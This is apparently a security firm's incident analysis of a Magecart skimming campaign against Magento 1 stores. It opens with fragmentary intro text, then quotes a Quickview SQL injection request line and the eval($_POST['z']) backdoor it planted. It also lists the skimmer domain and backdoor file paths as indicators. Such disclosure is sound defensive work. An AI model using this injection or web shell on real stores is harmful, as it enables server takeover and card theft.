Magecart?

Also known as digital skimming, this crime has surged since 2015. Criminals steal

work, and how have Magecart attacks evolved over time?
About Magecart

More than 350 ecommerce stores infected with malware in a single day.
Today our global crawler discovered 374 ecommerce stores infected with the same
strain of malware. 370 of these stores load the malware via
https://naturalfreshmall[.]com/image/pixel[.]js.
â€” Sansec (@sansecio) January 25, 2022
Last week Sansec detected a mass breach of over 500 stores running the Magento 1
ecommerce platform. All stores were victim of a payment skimmer loaded from the
naturalfreshmall.com domain. We invited victims to reach out to us, so we could find a
common point of entry and protect other merchants against a potentional new attack. The
first investigation is now completed: attackers used a clever combination of an SQL
injection (SQLi) and PHP Object Injection (POI) attack to gain control of the Magento store.

Zend_Memory_Manager POI attack
Attackers abused a (known) leak in the Quickview plugin. While this is typically abused to
inject rogue Magento admin users, in this case the attacker used the flaw to run code
directly on the server. But how?
First, the attacker abused Quickview to add a validation rule to the
customer_eav_attribute table:
45.72.31.112 2022-01-28T15:11:59Z "GET
/quickview/index/view/path/');UPDATE%20customer_eav_attribute%20SET%20validate_rules=
HTTP/1.1"

The added validation rule is (result of UNHEX()):

This POI payload is used to trick the host application into crafting a malicious object. In this
case Zend_Memory_Manager and Zend_CodeGenerator_Php_File are used to create a
file called api_1.php with a simple backdoor eval($_POST['z']) .

Signing up as new customer, activates attack
However, just adding it to the database will not run the code. Magento actually needs to
unserialize the data. And there is the cleverness of this attack: by using the validation rules
for new customers, the attacker can trigger an unserialize by simply browing the Magento
sign up page. This is illustrated with the following requests:
45.72.31.112
45.72.31.112

2022-01-28T15:12:02Z "GET /customer/account/create/ HTTP/1.1"
2022-01-28T15:12:08Z "GET /api_1.php HTTP/1.1"

Voila! The attacker can now run any PHP code via the api_1.php backdoor.
Are you also victim of this hack? Reach out to us and we will run a clean-up and
investigation free of charge.

Other indicators of compromise
In this case, the attacker left no less than 19 (!) backdoors on the system. It is essential to
eliminate each and every one of them, because leaving one in place means that your
system will be hit again next week.
The actual payment interception code was added to the core_config_data table in the
design/footer/absolute_footer section.
The following files were either entirely malicious, or are part of the Magento code but had
malicious code added to them. Your system may have similar or entirely different
backdoors, so we recommend to run a malware scanner to find all of them.
/api.php
/api_1.php
/install.php
/sc_api.php
/phpinfo.php
/adminer.php
/app/code/core/Mage/Page/Block/Html.php

NB. While the Magento 1 platform has been declared End-Of-Life by Adobe, thousands of
professional merchants are still using it. As Adobe does not provide security patches
anymore, we recommend to take extra measures to keep your store safe. Monitoring for
malware is vital (such as with our ecomscan scanner). Also, there are community-provided
patches available for Magento 1. Either open-source via OpenMage or with commercial
support via Mage-One.
